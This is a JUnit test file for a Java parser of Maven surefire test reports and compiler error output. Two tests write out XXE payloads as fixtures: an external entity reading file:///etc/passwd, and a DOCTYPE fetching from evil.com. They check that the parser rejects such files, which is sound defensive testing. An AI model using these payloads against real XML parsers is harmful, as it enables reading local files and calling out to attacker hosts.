package jerrinot.info.llmaven;

import jerrinot.info.llmaven.model.CompilerError;
import jerrinot.info.llmaven.model.TestFailure;
import jerrinot.info.llmaven.model.TestSummary;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

import java.io.File;
import java.io.IOException;
import java.net.URISyntaxException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.List;

import static org.junit.jupiter.api.Assertions.*;

class ArtifactParserTest {

    private final ArtifactParser parser = new ArtifactParser();

    private File reportsDir() throws URISyntaxException {
        return new File(getClass().getClassLoader().getResource("surefire-reports").toURI());
    }

    @Test
    void allPassFile() throws Exception {
        TestSummary summary = parser.parseReportsDir(reportsDir());
        // 3 (AllPass) + 5 (AppTest) + 2 (Skipped) = 10
        assertEquals(10, summary.getTotal());
        assertEquals(1, summary.getFailures());
        assertEquals(1, summary.getErrors());
        assertEquals(2, summary.getSkipped());
        assertEquals(6, summary.getPassed());
        assertTrue(summary.hasFailures());
    }

    @Test
    void failureDetails() throws Exception {
        TestSummary summary = parser.parseReportsDir(reportsDir());
        assertEquals(2, summary.getFailureDetails().size());

        TestFailure failure = summary.getFailureDetails().stream()
                .filter(f -> f.getKind() == TestFailure.Kind.FAILURE)
                .findFirst().orElseThrow(AssertionError::new);
        assertEquals("com.example.AppTest", failure.getClassName());
        assertEquals("testParseInput", failure.getMethodName());
        assertTrue(failure.getMessage().contains("expected:<42>"));
        assertTrue(failure.getStackTrace().contains("AppTest.java:27"));

        TestFailure error = summary.getFailureDetails().stream()
                .filter(f -> f.getKind() == TestFailure.Kind.ERROR)
                .findFirst().orElseThrow(AssertionError::new);
        assertEquals("com.example.AppTest", error.getClassName());
        assertEquals("testEdgeCase", error.getMethodName());
        assertTrue(error.getStackTrace().contains("NullPointerException"));
    }

    @Test
    void missingDirectory() {
        TestSummary summary = parser.parseReportsDir(new File("/nonexistent/dir"));
        assertSame(TestSummary.EMPTY, summary);
        assertFalse(summary.hasFailures());
        assertEquals(0, summary.getTotal());
    }

    @Test
    void emptyDirectory(@TempDir Path tempDir) {
        TestSummary summary = parser.parseReportsDir(tempDir.toFile());
        assertSame(TestSummary.EMPTY, summary);
    }

    @Test
    void corruptXml(@TempDir Path tempDir) throws IOException {
        Files.write(tempDir.resolve("TEST-corrupt.xml"), "<<<not xml>>>".getBytes());
        TestSummary summary = parser.parseReportsDir(tempDir.toFile());
        // Should not throw; returns empty counts since the corrupt file is skipped
        assertEquals(0, summary.getTotal());
    }

    @Test
    void nonTestXmlIgnored(@TempDir Path tempDir) throws IOException {
        // A file that doesn't match TEST-*.xml should be ignored
        Files.write(tempDir.resolve("pom.xml"), "<project/>".getBytes());
        TestSummary summary = parser.parseReportsDir(tempDir.toFile());
        assertSame(TestSummary.EMPTY, summary);
    }

    @Test
    void longStackTraceIsTruncated() {
        StringBuilder sb = new StringBuilder("java.lang.RuntimeException: boom\n");
        for (int i = 0; i < 50; i++) {
            sb.append("\tat com.example.Class.method(Class.java:").append(i).append(")\n");
        }
        String truncated = ArtifactParser.truncateStackTrace(sb.toString());
        String[] lines = truncated.split("\n");
        // 20 lines of content + 1 "... N more lines" line
        assertEquals(21, lines.length);
        assertTrue(lines[20].contains("more lines"));
    }

    @Test
    void emptyStackTraceReturnsEmpty() {
        assertEquals("", ArtifactParser.truncateStackTrace(""));
        assertEquals("", ArtifactParser.truncateStackTrace(null));
    }

    @Test
    void windowsLineEndingsNormalized() {
        StringBuilder sb = new StringBuilder("java.lang.RuntimeException: boom\r\n");
        for (int i = 0; i < 5; i++) {
            sb.append("\tat com.example.Class.method(Class.java:").append(i).append(")\r\n");
        }
        String result = ArtifactParser.truncateStackTrace(sb.toString());
        assertFalse(result.contains("\r"), "Result should not contain \\r");
        assertTrue(result.contains("\n"));
    }

    @Test
    void longStackTraceWithWindowsLineEndings() {
        StringBuilder sb = new StringBuilder("java.lang.RuntimeException: boom\r\n");
        for (int i = 0; i < 50; i++) {
            sb.append("\tat com.example.Class.method(Class.java:").append(i).append(")\r\n");
        }
        String result = ArtifactParser.truncateStackTrace(sb.toString());
        assertFalse(result.contains("\r"), "Result should not contain \\r");
        String[] lines = result.split("\n");
        assertEquals(21, lines.length);
        assertTrue(lines[20].contains("more lines"));
    }

    @Test
    void stackTraceExactly20LinesNotTruncated() {
        StringBuilder sb = new StringBuilder("java.lang.RuntimeException: boom");
        for (int i = 1; i < 20; i++) {
            sb.append("\n\tat com.example.Class.method(Class.java:").append(i).append(")");
        }
        String result = ArtifactParser.truncateStackTrace(sb.toString());
        String[] lines = result.split("\n");
        assertEquals(20, lines.length, "Exactly 20 lines should not be truncated");
        assertFalse(result.contains("more lines"), "No truncation message for exactly 20 lines");
    }

    @Test
    void stackTraceOf21LinesIsTruncated() {
        StringBuilder sb = new StringBuilder("java.lang.RuntimeException: boom");
        for (int i = 1; i <= 20; i++) {
            sb.append("\n\tat com.example.Class.method(Class.java:").append(i).append(")");
        }
        String result = ArtifactParser.truncateStackTrace(sb.toString());
        String[] lines = result.split("\n");
        assertEquals(21, lines.length, "20 content lines + 1 truncation line");
        assertTrue(lines[20].contains("1 more line"), "Should say 1 more line");
        assertFalse(lines[20].contains("1 more lines"), "Should use singular 'line' not 'lines'");
    }

    @Test
    void truncateStackTracePreservesFirstLineContent() {
        String trace = "java.lang.RuntimeException: boom\n\tat line1\n\tat line2";
        String result = ArtifactParser.truncateStackTrace(trace);
        assertTrue(result.startsWith("java.lang.RuntimeException: boom"));
    }

    @Test
    void truncateStackTraceWithTrailingNewline() {
        String trace = "single line\n";
        String result = ArtifactParser.truncateStackTrace(trace);
        assertEquals("single line", result);
    }

    @Test
    void missingTestsAttributeDefaultsToZero(@TempDir Path tempDir) throws IOException {
        // XML with no "tests" attribute on root element
        Files.write(tempDir.resolve("TEST-NoAttr.xml"),
                ("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
                        + "<testsuite name=\"NoAttr\" failures=\"0\" errors=\"0\" skipped=\"0\">\n"
                        + "</testsuite>").getBytes());
        TestSummary summary = parser.parseReportsDir(tempDir.toFile());
        assertEquals(0, summary.getTotal());
        assertEquals(0, summary.getFailures());
    }

    @Test
    void nonNumericAttributeDefaultsToZero(@TempDir Path tempDir) throws IOException {
        Files.write(tempDir.resolve("TEST-BadAttr.xml"),
                ("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
                        + "<testsuite name=\"BadAttr\" tests=\"abc\" failures=\"xyz\" errors=\"\" skipped=\"0\">\n"
                        + "</testsuite>").getBytes());
        TestSummary summary = parser.parseReportsDir(tempDir.toFile());
        assertEquals(0, summary.getTotal());
        assertEquals(0, summary.getFailures());
        assertEquals(0, summary.getErrors());
    }

    @Test
    void testcaseWithBothFailureAndError(@TempDir Path tempDir) throws IOException {
        Files.write(tempDir.resolve("TEST-BothKinds.xml"),
                ("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
                        + "<testsuite name=\"BothKinds\" tests=\"1\" failures=\"1\" errors=\"1\" skipped=\"0\">\n"
                        + "  <testcase name=\"testBoth\" classname=\"com.example.BothTest\" time=\"0.01\">\n"
                        + "    <failure message=\"assertion failed\">assertion stack trace</failure>\n"
                        + "    <error message=\"runtime error\">error stack trace</error>\n"
                        + "  </testcase>\n"
                        + "</testsuite>").getBytes());
        TestSummary summary = parser.parseReportsDir(tempDir.toFile());
        assertEquals(1, summary.getTotal());
        assertEquals(1, summary.getFailures());
        assertEquals(1, summary.getErrors());
        // Both failure details should be extracted
        assertEquals(2, summary.getFailureDetails().size());

        TestFailure failure = summary.getFailureDetails().stream()
                .filter(f -> f.getKind() == TestFailure.Kind.FAILURE)
                .findFirst().orElseThrow(AssertionError::new);
        assertEquals("com.example.BothTest", failure.getClassName());
        assertEquals("testBoth", failure.getMethodName());
        assertEquals("assertion failed", failure.getMessage());

        TestFailure error = summary.getFailureDetails().stream()
                .filter(f -> f.getKind() == TestFailure.Kind.ERROR)
                .findFirst().orElseThrow(AssertionError::new);
        assertEquals("com.example.BothTest", error.getClassName());
        assertEquals("runtime error", error.getMessage());
    }

    @Test
    void testcaseWithEmptyClassnameAndName(@TempDir Path tempDir) throws IOException {
        Files.write(tempDir.resolve("TEST-Empty.xml"),
                ("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
                        + "<testsuite name=\"Empty\" tests=\"1\" failures=\"1\" errors=\"0\" skipped=\"0\">\n"
                        + "  <testcase name=\"\" classname=\"\" time=\"0.01\">\n"
                        + "    <failure message=\"fail\">stack</failure>\n"
                        + "  </testcase>\n"
                        + "</testsuite>").getBytes());
        TestSummary summary = parser.parseReportsDir(tempDir.toFile());
        assertEquals(1, summary.getFailureDetails().size());
        TestFailure f = summary.getFailureDetails().get(0);
        assertEquals("", f.getClassName());
        assertEquals("", f.getMethodName());
    }

    @Test
    void testcaseWithNoFailureOrErrorElementsIsSkipped(@TempDir Path tempDir) throws IOException {
        Files.write(tempDir.resolve("TEST-Pass.xml"),
                ("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
                        + "<testsuite name=\"Pass\" tests=\"2\" failures=\"0\" errors=\"0\" skipped=\"0\">\n"
                        + "  <testcase name=\"testA\" classname=\"com.example.Pass\" time=\"0.01\"/>\n"
                        + "  <testcase name=\"testB\" classname=\"com.example.Pass\" time=\"0.01\"/>\n"
                        + "</testsuite>").getBytes());
        TestSummary summary = parser.parseReportsDir(tempDir.toFile());
        assertEquals(2, summary.getTotal());
        assertEquals(0, summary.getFailures());
        assertTrue(summary.getFailureDetails().isEmpty());
    }

    @Test
    void failureWithEmptyMessageAttribute(@TempDir Path tempDir) throws IOException {
        Files.write(tempDir.resolve("TEST-EmptyMsg.xml"),
                ("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
                        + "<testsuite name=\"EmptyMsg\" tests=\"1\" failures=\"1\" errors=\"0\" skipped=\"0\">\n"
                        + "  <testcase name=\"testFail\" classname=\"com.example.EmptyMsg\" time=\"0.01\">\n"
                        + "    <failure message=\"\">stack trace here</failure>\n"
                        + "  </testcase>\n"
                        + "</testsuite>").getBytes());
        TestSummary summary = parser.parseReportsDir(tempDir.toFile());
        assertEquals(1, summary.getFailureDetails().size());
        TestFailure f = summary.getFailureDetails().get(0);
        assertEquals("", f.getMessage());
        assertTrue(f.getStackTrace().contains("stack trace here"));
    }

    @Test
    void failureWithNoMessageAttribute(@TempDir Path tempDir) throws IOException {
        Files.write(tempDir.resolve("TEST-NoMsg.xml"),
                ("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
                        + "<testsuite name=\"NoMsg\" tests=\"1\" failures=\"1\" errors=\"0\" skipped=\"0\">\n"
                        + "  <testcase name=\"testFail\" classname=\"com.example.NoMsg\" time=\"0.01\">\n"
                        + "    <failure>stack trace here</failure>\n"
                        + "  </testcase>\n"
                        + "</testsuite>").getBytes());
        TestSummary summary = parser.parseReportsDir(tempDir.toFile());
        assertEquals(1, summary.getFailureDetails().size());
        TestFailure f = summary.getFailureDetails().get(0);
        // getAttribute returns "" for missing attributes in DOM
        assertEquals("", f.getMessage());
    }

    @Test
    void failureWithEmptyTextContent(@TempDir Path tempDir) throws IOException {
        Files.write(tempDir.resolve("TEST-EmptyStack.xml"),
                ("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
                        + "<testsuite name=\"EmptyStack\" tests=\"1\" failures=\"1\" errors=\"0\" skipped=\"0\">\n"
                        + "  <testcase name=\"testFail\" classname=\"com.example.EmptyStack\" time=\"0.01\">\n"
                        + "    <failure message=\"assertion\"></failure>\n"
                        + "  </testcase>\n"
                        + "</testsuite>").getBytes());
        TestSummary summary = parser.parseReportsDir(tempDir.toFile());
        assertEquals(1, summary.getFailureDetails().size());
        TestFailure f = summary.getFailureDetails().get(0);
        assertEquals("assertion", f.getMessage());
        assertEquals("", f.getStackTrace());
    }

    @Test
    void multipleXmlFilesAggregated(@TempDir Path tempDir) throws IOException {
        Files.write(tempDir.resolve("TEST-A.xml"),
                ("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
                        + "<testsuite name=\"A\" tests=\"3\" failures=\"1\" errors=\"0\" skipped=\"0\">\n"
                        + "  <testcase name=\"test1\" classname=\"A\" time=\"0.01\">\n"
                        + "    <failure message=\"fail\">trace</failure>\n"
                        + "  </testcase>\n"
                        + "</testsuite>").getBytes());
        Files.write(tempDir.resolve("TEST-B.xml"),
                ("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
                        + "<testsuite name=\"B\" tests=\"5\" failures=\"0\" errors=\"1\" skipped=\"1\">\n"
                        + "  <testcase name=\"test2\" classname=\"B\" time=\"0.01\">\n"
                        + "    <error message=\"err\">err trace</error>\n"
                        + "  </testcase>\n"
                        + "</testsuite>").getBytes());

        TestSummary summary = parser.parseReportsDir(tempDir.toFile());
        assertEquals(8, summary.getTotal());
        assertEquals(1, summary.getFailures());
        assertEquals(1, summary.getErrors());
        assertEquals(1, summary.getSkipped());
        assertEquals(2, summary.getFailureDetails().size());
    }

    @Test
    void corruptXmlAmongValidFiles(@TempDir Path tempDir) throws IOException {
        // Valid file
        Files.write(tempDir.resolve("TEST-Valid.xml"),
                ("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
                        + "<testsuite name=\"Valid\" tests=\"3\" failures=\"0\" errors=\"0\" skipped=\"0\">\n"
                        + "</testsuite>").getBytes());
        // Corrupt file
        Files.write(tempDir.resolve("TEST-Corrupt.xml"), "not xml at all {{{".getBytes());

        TestSummary summary = parser.parseReportsDir(tempDir.toFile());
        // Corrupt file should be skipped, valid file counts should still be accumulated
        assertEquals(3, summary.getTotal());
    }

    @Test
    void fileNotStartingWithTestPrefixIgnored(@TempDir Path tempDir) throws IOException {
        Files.write(tempDir.resolve("RESULT-com.example.Test.xml"),
                ("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
                        + "<testsuite name=\"Test\" tests=\"5\" failures=\"0\" errors=\"0\" skipped=\"0\">\n"
                        + "</testsuite>").getBytes());
        TestSummary summary = parser.parseReportsDir(tempDir.toFile());
        assertSame(TestSummary.EMPTY, summary);
    }

    @Test
    void corruptXmlEmitsDiagnosticToConsumer(@TempDir Path tempDir) throws IOException {
        Files.write(tempDir.resolve("TEST-corrupt.xml"), "<<<not xml>>>".getBytes());
        List<String> diagnostics = new ArrayList<>();
        parser.parseReportsDir(tempDir.toFile(), diagnostics::add);
        assertEquals(1, diagnostics.size());
        assertTrue(diagnostics.get(0).contains("skipping corrupt report TEST-corrupt.xml"),
                "Expected diagnostic message: " + diagnostics.get(0));
    }

    @Test
    void diagnosticsConsumerReceivesAllCorruptFileMessages(@TempDir Path tempDir) throws IOException {
        // Two corrupt files and one valid file
        Files.write(tempDir.resolve("TEST-Corrupt1.xml"), "<<<not xml>>>".getBytes());
        Files.write(tempDir.resolve("TEST-Corrupt2.xml"), "{json not xml}".getBytes());
        Files.write(tempDir.resolve("TEST-Valid.xml"),
                ("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
                        + "<testsuite name=\"Valid\" tests=\"5\" failures=\"0\" errors=\"0\" skipped=\"0\">\n"
                        + "</testsuite>").getBytes());
        List<String> diagnostics = new ArrayList<>();
        TestSummary summary = parser.parseReportsDir(tempDir.toFile(), diagnostics::add);
        // Valid file data should still be accumulated
        assertEquals(5, summary.getTotal(), "Valid file tests should be counted");
        // Both corrupt files should trigger diagnostics
        assertEquals(2, diagnostics.size(), "Should emit diagnostics for both corrupt files");
        assertTrue(diagnostics.stream().anyMatch(d -> d.contains("TEST-Corrupt1.xml")),
                "Should mention Corrupt1: " + diagnostics);
        assertTrue(diagnostics.stream().anyMatch(d -> d.contains("TEST-Corrupt2.xml")),
                "Should mention Corrupt2: " + diagnostics);
    }

    @Test
    void diagnosticsConsumerNotCalledForValidFiles(@TempDir Path tempDir) throws IOException {
        Files.write(tempDir.resolve("TEST-Good.xml"),
                ("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
                        + "<testsuite name=\"Good\" tests=\"3\" failures=\"0\" errors=\"0\" skipped=\"0\">\n"
                        + "</testsuite>").getBytes());
        List<String> diagnostics = new ArrayList<>();
        TestSummary summary = parser.parseReportsDir(tempDir.toFile(), diagnostics::add);
        assertEquals(3, summary.getTotal());
        assertTrue(diagnostics.isEmpty(), "No diagnostics should be emitted for valid files");
    }

    @Test
    void xxeDoctypeDeclarationIsRejected(@TempDir Path tempDir) throws IOException {
        // XML with a DOCTYPE declaration that attempts XXE
        Files.write(tempDir.resolve("TEST-XXE.xml"),
                ("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
                        + "<!DOCTYPE foo [\n"
                        + "  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n"
                        + "]>\n"
                        + "<testsuite name=\"XXE\" tests=\"1\" failures=\"0\" errors=\"0\" skipped=\"0\">\n"
                        + "  <testcase name=\"test\" classname=\"com.example.XXE\" time=\"0.01\"/>\n"
                        + "</testsuite>").getBytes());
        List<String> diagnostics = new ArrayList<>();
        TestSummary summary = parser.parseReportsDir(tempDir.toFile(), diagnostics::add);
        // The parser should reject the DOCTYPE and skip the file via the corrupt handler
        assertEquals(0, summary.getTotal(), "XXE-containing file should be skipped");
        assertEquals(1, diagnostics.size(), "Should emit exactly one diagnostic for rejected DOCTYPE");
        assertTrue(diagnostics.get(0).contains("skipping corrupt report TEST-XXE.xml"),
                "Diagnostic should mention skipping corrupt file: " + diagnostics.get(0));
    }

    @Test
    void xxeDoctypeAmongValidFilesOnlySkipsMalicious(@TempDir Path tempDir) throws IOException {
        // Valid file
        Files.write(tempDir.resolve("TEST-Good.xml"),
                ("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
                        + "<testsuite name=\"Good\" tests=\"4\" failures=\"0\" errors=\"0\" skipped=\"0\">\n"
                        + "</testsuite>").getBytes());
        // XXE file
        Files.write(tempDir.resolve("TEST-Evil.xml"),
                ("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
                        + "<!DOCTYPE foo SYSTEM \"http://evil.com/xxe\">\n"
                        + "<testsuite name=\"Evil\" tests=\"1\" failures=\"0\" errors=\"0\" skipped=\"0\">\n"
                        + "</testsuite>").getBytes());
        List<String> diagnostics = new ArrayList<>();
        TestSummary summary = parser.parseReportsDir(tempDir.toFile(), diagnostics::add);
        // Only the valid file's tests should be counted
        assertEquals(4, summary.getTotal(), "Only valid file tests should be counted");
        assertEquals(1, diagnostics.size(), "Should emit one diagnostic for rejected file");
    }

    @Test
    void clearThreadLocalDoesNotThrow(@TempDir Path tempDir) throws Exception {
        // Call clearThreadLocal twice — neither should throw
        ArtifactParser.clearThreadLocal();
        ArtifactParser.clearThreadLocal();

        // Verify the parser still works after clearing (parse a valid XML file)
        Files.write(tempDir.resolve("TEST-AfterClear.xml"),
                ("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
                        + "<testsuite name=\"AfterClear\" tests=\"2\" failures=\"0\" errors=\"0\" skipped=\"0\">\n"
                        + "  <testcase name=\"testA\" classname=\"com.example.AfterClear\" time=\"0.01\"/>\n"
                        + "  <testcase name=\"testB\" classname=\"com.example.AfterClear\" time=\"0.02\"/>\n"
                        + "</testsuite>").getBytes());
        TestSummary summary = parser.parseReportsDir(tempDir.toFile());
        assertEquals(2, summary.getTotal(), "Parser should work correctly after clearThreadLocal");
        assertEquals(0, summary.getFailures());
    }

    @Test
    void regularFileNotDirectoryReturnsEmpty() throws IOException {
        // A regular file, not a directory
        File tempFile = File.createTempFile("not-a-dir", ".txt");
        tempFile.deleteOnExit();
        TestSummary summary = parser.parseReportsDir(tempFile);
        assertSame(TestSummary.EMPTY, summary);
    }

    // --- parseCompilerOutput tests ---

    @Test
    void parseCompilerOutputStandardFormat() {
        String output = "[ERROR] /home/user/project/src/main/java/com/example/App.java:[10,15] cannot find symbol";
        List<CompilerError> errors = ArtifactParser.parseCompilerOutput(output);
        assertEquals(1, errors.size());
        CompilerError e = errors.get(0);
        assertEquals("/home/user/project/src/main/java/com/example/App.java", e.getFile());
        assertEquals(10, e.getLine());
        assertEquals(15, e.getColumn());
        assertEquals("cannot find symbol", e.getMessage());
    }

    @Test
    void parseCompilerOutputWithoutErrorPrefix() {
        String output = "  /src/main/java/App.java:[5,1] ';' expected";
        List<CompilerError> errors = ArtifactParser.parseCompilerOutput(output);
        assertEquals(1, errors.size());
        assertEquals("/src/main/java/App.java", errors.get(0).getFile());
        assertEquals(5, errors.get(0).getLine());
        assertEquals(1, errors.get(0).getColumn());
        assertEquals("';' expected", errors.get(0).getMessage());
    }

    @Test
    void parseCompilerOutputMultipleErrors() {
        String output = "[ERROR] /src/App.java:[10,5] cannot find symbol\n"
                + "[ERROR] /src/App.java:[20,1] ';' expected\n"
                + "[ERROR] /src/Util.java:[3,8] incompatible types";
        List<CompilerError> errors = ArtifactParser.parseCompilerOutput(output);
        assertEquals(3, errors.size());
        assertEquals("/src/App.java", errors.get(0).getFile());
        assertEquals(10, errors.get(0).getLine());
        assertEquals("/src/App.java", errors.get(1).getFile());
        assertEquals(20, errors.get(1).getLine());
        assertEquals("/src/Util.java", errors.get(2).getFile());
        assertEquals("incompatible types", errors.get(2).getMessage());
    }

    @Test
    void parseCompilerOutputNullReturnsEmpty() {
        List<CompilerError> errors = ArtifactParser.parseCompilerOutput(null);
        assertTrue(errors.isEmpty());
    }

    @Test
    void parseCompilerOutputEmptyStringReturnsEmpty() {
        List<CompilerError> errors = ArtifactParser.parseCompilerOutput("");
        assertTrue(errors.isEmpty());
    }

    @Test
    void parseCompilerOutputNoMatchingLines() {
        String output = "Some random text\nwith no compiler errors\n[INFO] BUILD SUCCESS";
        List<CompilerError> errors = ArtifactParser.parseCompilerOutput(output);
        assertTrue(errors.isEmpty());
    }

    @Test
    void parseCompilerOutputTruncatesAt25() {
        StringBuilder sb = new StringBuilder();
        for (int i = 1; i <= 30; i++) {
            sb.append("[ERROR] /src/App.java:[").append(i).append(",1] error ").append(i).append('\n');
        }
        List<CompilerError> errors = ArtifactParser.parseCompilerOutput(sb.toString());
        assertEquals(25, errors.size());
        assertEquals(1, errors.get(0).getLine());
        assertEquals(25, errors.get(24).getLine());
    }

    @Test
    void parseCompilerOutputMixedWithNonErrorLines() {
        String output = "[INFO] Compiling 5 source files\n"
                + "[ERROR] /src/App.java:[10,5] cannot find symbol\n"
                + "[INFO] some other info\n"
                + "[ERROR] /src/Util.java:[3,1] method not found";
        List<CompilerError> errors = ArtifactParser.parseCompilerOutput(output);
        assertEquals(2, errors.size());
    }

    @Test
    void parseCompilerOutputExactly25NotTruncated() {
        StringBuilder sb = new StringBuilder();
        for (int i = 1; i <= 25; i++) {
            sb.append("[ERROR] /src/App.java:[").append(i).append(",1] error ").append(i).append('\n');
        }
        List<CompilerError> errors = ArtifactParser.parseCompilerOutput(sb.toString());
        assertEquals(25, errors.size());
    }
}
